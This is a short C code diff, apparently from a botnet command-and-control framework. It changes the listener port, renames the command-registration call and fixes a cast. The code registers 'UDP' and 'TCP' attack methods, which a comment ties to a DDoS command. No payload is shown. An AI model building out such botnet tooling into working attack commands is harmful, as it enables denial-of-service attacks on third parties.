@@ -48,13 +48,13 @@ void test_cmd(void *x, void *c, str *cmd, Arr *Args) {
 //
 Cogs *cogs = NULL;
 void ConstructBotnet() {
-    PORT = string("1337");
+    PORT = string("1338");
     THEME_NAME = string("builtin");
 
     cogs = InitCogs();
 
     // Simply add your command here ( USAGE: cogs->Add(Cogs *c, const char **alias, const int max_argc, const int rank, void *fn); )
-    cogs->Add(cogs, Array((char **)TEST_CMD_ALIAS), TEST_CMD_ARGS, TEST_CMD_RANK_LEVEL, test_cmd);
+    cogs->AddCmd(cogs, Array((char **)TEST_CMD_ALIAS), TEST_CMD_ARGS, TEST_CMD_RANK_LEVEL, test_cmd);
 
     char *METHODS[] = {"UDP", "TCP", NULL}; // Used as an example (this would be with your ddos command)
     // Add all methods from your array of methods linking to method handler command
@@ -63,7 +63,7 @@ void ConstructBotnet() {
             break; 
         
         char *args[] = {METHODS[i], NULL};
-        cogs->Add(cogs, Array(args), 4, 1, NULL);
+        cogs->AddCmd(cogs, Array(args), 4, 1, NULL);
     }
 }
 
@@ -79,6 +79,6 @@ int main(int argc, char *argv[]) {
 
     char *buffer[100];
     printf("Press any key to exit\n");
-    fgets(&buffer, 100, stdin); // keep blocking until something is pressed
+    fgets((char *)&buffer, 100, stdin); // keep blocking until something is pressed
     return 0;
 }
